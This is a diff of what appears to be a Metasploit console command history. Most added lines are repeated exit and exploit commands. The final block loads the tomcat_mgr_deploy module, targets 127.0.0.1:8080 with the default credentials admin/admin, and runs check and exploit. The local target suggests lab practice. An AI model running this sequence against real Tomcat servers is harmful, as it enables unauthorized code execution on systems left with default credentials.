@@ -216,3 +216,34 @@ exploit
 exit
 exploit
 exit
+exit
+exit
+exit
+exit
+exit
+exploit
+exploit --help
+help
+exploit -j -z
+exploit
+exploit help
+exploit -h
+exploit -j
+exit
+exit -y
+exit
+show options
+exit
+exit
+exploit
+exit
+exit
+use exploit/multi/http/tomcat_mgr_deploy
+show options
+set RHOST 127.0.0.1
+set RPORT 8080
+set HttpUsername admin
+set HttpPassword admin
+check
+exploit
+exit
